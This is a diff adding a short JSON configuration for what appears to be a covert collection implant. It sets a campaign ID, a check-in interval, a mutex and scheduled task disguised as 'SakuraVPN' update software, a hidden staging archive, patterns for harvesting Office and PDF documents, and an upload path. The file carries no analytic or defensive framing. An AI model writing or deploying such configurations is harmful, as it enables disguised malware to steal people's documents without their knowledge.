@@ -1,0 +1,11 @@
+{
+  "profile": "kumo-collector-stable",
+  "campaign_id": "KITSUNE-42",
+  "checkin_seconds": 300,
+  "mutex": "Global\\SakuraVPN_KITSUNE_42",
+  "scheduled_task": "SakuraVPN Update Check",
+  "staging_path": "C:\\ProgramData\\SakuraVPN\\cache\\kumo_stage.zip",
+  "collection_patterns": ["*.docx", "*.xlsx", "*.pdf"],
+  "archive_format": "zip",
+  "upload_path": "/uploads/"
+}
